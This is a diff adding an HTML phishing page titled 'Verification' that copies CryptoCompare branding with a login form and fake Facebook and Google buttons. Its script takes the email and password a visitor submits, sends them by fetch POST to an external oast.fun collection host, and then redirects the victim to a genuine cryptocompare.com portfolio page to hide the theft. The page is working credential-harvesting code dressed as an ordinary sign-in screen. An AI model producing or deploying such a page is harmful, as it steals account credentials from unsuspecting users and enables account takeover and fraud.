@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <link rel="icon" href="https://www.cryptocompare.com/media/20562/favicon.png?v=2" type="image/png">
+    <style>
+        body {
+            background-image: url('https://raw.githubusercontent.com/Usama3423/web/main/Screenshot%202024-08-15%20191149.png');
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #041727;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+            color: #ffffff;
+            position: relative;
+        }
+
+        .login-container h2 {
+            color: #00ff44;
+            margin-bottom: 20px;
+        }
+
+        .social-login-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .social-btn {
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 48%;
+            color: #ffffff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .facebook-btn {
+            background-color: #3b5998;
+        }
+
+        .google-btn {
+            background-color: #dd4b39;
+        }
+
+        .tab-buttons {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .tab-btn {
+            padding: 10px;
+            margin: 0 5px;
+            border: 1px solid #00ff44;
+            color: #00ff44;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+
+        .tab-btn.active {
+            background-color: #00ff44;
+            color: #041727;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .forgot-password {
+            text-align: right;
+            font-size: 14px;
+            margin-top: -10px;
+            margin-bottom: 15px;
+        }
+
+        .forgot-password a {
+            color: #00ff44;
+            text-decoration: none;
+        }
+
+        .login-btn {
+            background-color: #00ff44;
+            color: #041727;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .legal-text {
+            font-size: 12px;
+            color: #bbbbbb;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <h2>Sign in</h2>
+        <div class="social-login-buttons">
+            <a href="#" class="social-btn facebook-btn">Facebook Login</a>
+            <a href="#" class="social-btn google-btn">Google Login</a>
+        </div>
+        <div class="tab-buttons">
+            <button class="tab-btn active">LOGIN</button>
+            <button class="tab-btn">SIGNUP</button>
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="loginUsername" placeholder="Type in your email">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="loginPassword" placeholder="Type in your password">
+            </div>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            <button class="login-btn" type="submit">Login</button>
+        </form>
+        <div class="legal-text">
+            This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission behavior
+            event.preventDefault();
+
+            // Get the values entered by the user
+            var email = document.getElementById('loginUsername').value;
+            var password = document.getElementById('loginPassword').value;
+
+            // Log the email and password
+            console.log("Email:", email);
+            console.log("Password:", password);
+
+            // Send the email and password to the server
+            fetch('https://jksuolqicsmqvwaztvtw2ttl79zcd2y0o.oast.fun', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => {
+                // Redirect the user to the specified link
+                window.location.href = 'https://www.cryptocompare.com/portfolio-public/?id=634375&user-id=2538410';
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+
+</html>
